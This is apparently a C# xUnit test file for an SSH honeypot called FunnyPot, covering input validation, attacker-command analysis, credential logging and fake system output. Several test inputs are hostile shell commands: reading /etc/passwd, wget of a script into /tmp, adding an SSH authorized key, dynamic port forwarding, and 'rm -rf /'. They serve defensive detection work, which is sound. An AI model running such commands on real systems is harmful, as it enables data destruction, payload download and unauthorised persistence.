using Xunit;

namespace FunnyPot.Tests;

public class InputValidatorTests
{
    [Fact]
    public void Validate_NullInput_ReturnsFalse()
    {
        var result = InputValidator.Validate(null!);
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_EmptyInput_ReturnsFalse()
    {
        var result = InputValidator.Validate("");
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_WhitespaceInput_ReturnsTrue()
    {
        var result = InputValidator.Validate("   ");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ExceedsMaxLength_ReturnsFalse()
    {
        var longInput = new string('a', InputValidator.MaxInputLength + 1);
        var result = InputValidator.Validate(longInput);
        Assert.False(result.isValid);
        Assert.Contains("Input too long", result.error);
    }

    [Fact]
    public void Validate_AtMaxLength_ReturnsTrue()
    {
        var sb = new System.Text.StringBuilder(InputValidator.MaxInputLength);
        for (int i = 0; i < InputValidator.MaxInputLength; i++)
            sb.Append(i % 2 == 0 ? 'a' : 'b');
        var result = InputValidator.Validate(sb.ToString());
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ContainsNullByte_ReturnsFalse()
    {
        var input = "test\0data";
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Binary content not allowed", result.error);
    }

    [Fact]
    public void Validate_NoNullBytes_ReturnsTrue()
    {
        var result = InputValidator.Validate("正常输入");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_RepetitiveCharsExceedsLimit_ReturnsFalse()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars + 1);
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Repetitive input detected", result.error);
    }

    [Fact]
    public void Validate_ValidRepetitiveInput_ReturnsTrue()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars);
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_NormalCommand_ReturnsTrue()
    {
        var result = InputValidator.Validate("ls -la /home");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ValidLongInput_ReturnsTrue()
    {
        var input = "ls -la /home/user/documents/projects/codebase/src/modules/utilities/helpers/";
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }
}

public class SCPDetectorTests
{
    [Theory]
    [InlineData("scp", true)]
    [InlineData("SCP", true)]
    [InlineData("scp -t somefile", true)]
    [InlineData("scp -f somefile", true)]
    [InlineData("sftp", true)]
    [InlineData("SFTP", true)]
    [InlineData("ls -la", false)]
    [InlineData("cat file.txt", false)]
    [InlineData("cd /home", false)]
    [InlineData("rm -rf /", false)]
    [InlineData("git commit -m 'fix'", false)]
    [InlineData("grep -r 'foo' .", false)]
    [InlineData("tar -cf archive.tar .", false)]
    public void IsSCPCommand_DetectsCorrectly(string input, bool expected)
    {
        var result = SCPDetector.IsSCPCommand(input);
        Assert.Equal(expected, result);
    }
}

public class DataHarvesterTests
{
    [Fact]
    public void LevenshteinDistance_DetectsPasswordMutation()
    {
        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
        Assert.Equal(1, distance);
    }

    [Fact]
    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
    {
        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Equal(1, analysis.DiscoveryDepthScore);
        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
        Assert.Contains("T1105", analysis.MitreAttackTechniques);
        Assert.Contains("T1083", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
    {
        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");

        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
        Assert.True(analysis.AssetValuePerceptionScore > 0);
    }

    [Fact]
    public void CalculateFingerprintHash_IsDeterministicAndNormalizesInput()
    {
        var first = DataHarvester.CalculateFingerprintHash("SSH-2.0-Client", "RSA-SHA2-512", "AA:BB");
        var second = DataHarvester.CalculateFingerprintHash("ssh-2.0-client", "rsa-sha2-512", "aa:bb");

        Assert.Equal(first, second);
        Assert.Equal(64, first.Length);
    }

    [Theory]
    [InlineData("127.0.0.1:22", "private", "private")]
    [InlineData("10.10.1.2:22", "private", "private")]
    [InlineData("8.8.8.8:22", "unknown", "lookup_unavailable")]
    public void CategorizeInfrastructure_ProfilesEndpoint(string endpoint, string category, string asn)
    {
        var profile = DataHarvester.CategorizeInfrastructure(endpoint);

        Assert.Equal(category, profile.Category);
        Assert.Equal(asn, profile.Asn);
    }

    [Fact]
    public void ShellSessionAnalytics_TracksFailureRatioAndSemanticDrift()
    {
        var analytics = new ShellSessionAnalytics { SessionStartedAt = DateTime.UtcNow.AddSeconds(-10) };

        analytics.RecordCommand(DataHarvester.AnalyzeCommand("ls"));
        analytics.RecordResult(false);
        analytics.RecordCommand(DataHarvester.AnalyzeCommand("cat /etc/passwd | grep root && wget http://example.com/a.sh"));
        analytics.RecordResult(true);

        Assert.Equal(0.5, analytics.StandardErrorRatio);
        Assert.True(analytics.SemanticDrift > 0);
        Assert.Contains("T1105", analytics.MitreTechniqueCounts.Keys);
        Assert.True(analytics.CalculateTuringMultiplier() > 0);
    }
}

public class NtfyNotifierTests
{
    [Fact]
    public void BuildShellSessionMessage_IncludesShellDetailsWithoutPassword()
    {
        var message = NtfyNotifier.BuildShellSessionMessage("203.0.113.5:49152", "abc123", "shell456", "SSH-2.0-TestClient", "root", "interactive");

        Assert.Contains("FunnyPot SSH shell opened", message);
        Assert.Contains("Remote: 203.0.113.5:49152", message);
        Assert.Contains("Session: abc123", message);
        Assert.Contains("Shell: shell456", message);
        Assert.Contains("Username: root", message);
        Assert.Contains("Type: interactive", message);
        Assert.Contains("Client: SSH-2.0-TestClient", message);
        Assert.DoesNotContain("Password:", message);
    }
}

public class LoggerTests
{
    [Fact]
    public void ShouldRequestDataPush_AllowsInitialAndElapsedRequests()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.True(Logger.ShouldRequestDataPush(now, DateTime.MinValue, interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-6), interval, force: false));
    }

    [Fact]
    public void ShouldRequestDataPush_DebouncesNonBoundaryEvents()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.False(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: true));
    }

    [Fact]
    public void ApplyHarvestSummaryEvent_TracksUniqueScanIpsAndShells()
    {
        var summary = new HarvestSummary();
        var timestamp = DateTime.UtcNow;

        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49152", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49153", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "198.51.100.7:22", Username = "support", Password = "password" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "shell_session_start", new SessionLogEntry(), timestamp);

        Assert.Equal(3, summary.TotalScanAttempts);
        Assert.Equal(2, summary.UniqueScanIps);
        Assert.Equal(2, summary.ScansByIp["203.0.113.5"]);
        Assert.Equal(1, summary.ScansByIp["198.51.100.7"]);
        Assert.Equal(2, summary.TopUsernames["root"]);
        Assert.Equal(1, summary.TopUsernames["support"]);
        Assert.Equal(2, summary.TopPasswords["admin"]);
        Assert.Equal(1, summary.TopPasswords["password"]);
        Assert.Equal(1, summary.TotalShells);
    }
}

public class ProgramTests
{
    [Theory]
    [InlineData("203.0.113.5:49152", "203.0.113.5")]
    [InlineData("[2001:db8::1]:49152", "2001:db8::1")]
    [InlineData("unknown", "unknown")]
    public void GetRemoteAttemptKey_UsesIpWithoutSourcePort(string remoteEndpoint, string expected)
    {
        Assert.Equal(expected, Program.GetRemoteAttemptKey(remoteEndpoint));
    }
}

public class CommandResolverTests
{
    [Fact]
    public void NormalizeExecutableName_HandlesObfuscatedBinPath()
    {
        Assert.Equal("uname", CommandResolver.NormalizeExecutableName("/bin/./uname"));
    }

    [Fact]
    public void FormatUname_ReturnsOldDebianKernelFingerprint()
    {
        var response = CommandResolver.FormatUname(new[] { "-s", "-v", "-n", "-r", "-m" });

        Assert.Contains("Linux", response);
        Assert.Contains("omegablack", response);
        Assert.Contains("3.16.0-4-amd64", response);
        Assert.Contains("Debian 3.16.51-3+deb8u1", response);
        Assert.Contains("x86_64", response);
    }

    [Fact]
    public void FormatUptimePretty_NeverReportsShortUptime()
    {
        Assert.Equal("up 47 days, 3 hours, 22 minutes", CommandResolver.FormatUptime(new[] { "-p" }));
    }
}

public class AppConfigurationTests
{
    [Fact]
    public void Load_WhenConfigMissing_ReturnsDefaults()
    {
        var config = AppConfiguration.Load("/tmp/non-existent-funnypot-config.yaml");

        Assert.Equal(22422, config.Ssh.Port);
        Assert.Equal(50, config.Ssh.MaxSessions);
        Assert.Equal(500, config.Llm.DelayMs);
    }

    [Fact]
    public void Load_WhenConfigExists_UsesFileValues()
    {
        var tempPath = Path.Combine(Path.GetTempPath(), $"funnypot-config-{Guid.NewGuid():N}.yaml");
        File.WriteAllText(tempPath, "ssh:\n  port: 23000\n  max-sessions: 10\nllm:\n  delay-ms: 250\n");

        try
        {
            var config = AppConfiguration.Load(tempPath);

            Assert.Equal(23000, config.Ssh.Port);
            Assert.Equal(10, config.Ssh.MaxSessions);
            Assert.Equal(250, config.Llm.DelayMs);
        }
        finally
        {
            File.Delete(tempPath);
        }
    }
}

public class SessionCommandWorkerTests
{
    [Fact]
    public void TryPost_RunsWorkOnDedicatedThreadInOrder()
    {
        using var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        using var completed = new ManualResetEventSlim(false);
        var order = new List<int>();
        var executingThreadId = 0;

        Assert.True(worker.TryPost(() =>
        {
            executingThreadId = Environment.CurrentManagedThreadId;
            order.Add(1);
        }));
        Assert.True(worker.TryPost(() => order.Add(2)));
        Assert.True(worker.TryPost(() =>
        {
            order.Add(3);
            completed.Set();
        }));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
        Assert.Equal(new[] { 1, 2, 3 }, order);
        Assert.Equal(worker.WorkerThreadId, executingThreadId);
        Assert.NotEqual(Environment.CurrentManagedThreadId, executingThreadId);
    }

    [Fact]
    public void TryPost_ReturnsFalseAfterDispose()
    {
        var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        worker.Dispose();

        Assert.False(worker.TryPost(() => { }));
    }
}

public class LlmRateLimiterTests
{
    [Fact]
    public void IsAllowed_LimitsEachSessionIndependently()
    {
        var sessionA = $"test-session-{Guid.NewGuid():N}";
        var sessionB = $"test-session-{Guid.NewGuid():N}";
        LlmRateLimiter.Reset(sessionA);
        LlmRateLimiter.Reset(sessionB);

        for (var i = 0; i < 20; i++)
            Assert.True(LlmRateLimiter.IsAllowed(sessionA, out _));

        Assert.False(LlmRateLimiter.IsAllowed(sessionA, out var fallbackMessage));
        Assert.Contains("Rate limit exceeded", fallbackMessage);
        Assert.True(LlmRateLimiter.IsAllowed(sessionB, out _));

        LlmRateLimiter.Reset(sessionA);
        LlmRateLimiter.Reset(sessionB);
    }
}
